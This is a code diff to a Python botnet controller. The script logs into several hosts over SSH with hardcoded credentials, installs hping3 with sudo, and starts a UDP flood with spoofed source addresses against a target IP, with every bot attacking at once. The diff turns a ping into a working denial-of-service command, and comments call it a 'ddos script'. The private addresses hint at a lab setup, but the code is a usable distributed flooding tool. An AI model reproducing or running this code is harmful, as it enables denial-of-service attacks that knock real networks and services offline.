@@ -30,10 +30,11 @@ targetipaddress='192.168.0.1'
 
 #set to download script onto bots
 downloadfile = ''
-#escalates privileges first then runs command    \015 is carriage return
-startscript = 'sudo ping ' + targetipaddress +  '\015' + passwd
+#escalates privileges first then runs hping3 udp flood
+startscript = 'sudo hping3 '+ targetipaddress + ' -q -n --udp -d 110 -p 53 --flood --rand-source' + '\015' + passwd
 #closes all connections
 closeconnection = 'exit \015'
+installhping = 'sudo apt-get install hping3' + '\015' + passwd  + '\015' + 'y'
 
 ###########################################################################################################
 ###########################################################################################################
@@ -95,8 +96,8 @@ def add_bot(host, user, password):
 #    add_bot(defaultipaddress + str(starthost), usern, passwd)
  #   starthost +=1
 
-add_bot('192.168.1.72', 'ubuntu', 'Password1')
-add_bot('192.168.1.73', 'ubuntu1', 'Password1')
+add_bot('192.168.86.47', 'ubuntu', 'Password1')
+#add_bot('192.168.1.63', 'ubuntu1', 'Password1')
 
 
 
@@ -105,15 +106,18 @@ print('\ndownloading script on bots')
 
 #runs function download file on all pcs simultaniously
 for bot in botnet:
-    Thread(target=command_bots, args=(bot, downloadfile, )).start()
+    Thread(target=command_bots, args=(bot, installhping, )).start()
+    
+for bot in botnet:
+    Thread(target=command_bots, args=(bot, startscript, )).start()
 
 #start ddos script one dos attack per session per thread
-print('\nrunning script on bots')       
-for bot in botnet:
-    for i in range(numberofsessions):
-        Thread(target=command_bots, args=(bot, startscript, )).start()
+#print('\nrunning script on bots')       
+#for bot in botnet:
+#    for i in range(numberofsessions):
+ #       Thread(target=command_bots, args=(bot, startscript, )).start()
   
 #closes each bots connection as to avoid potential problems        
-for bot in botnet:
-    for i in range(numberofsessions):
-        Thread(target=command_bots, args=(bot, closeconnection, )).start()   
+#for bot in botnet:
+ #   for i in range(numberofsessions):
+ #       Thread(target=command_bots, args=(bot, closeconnection, )).start()   
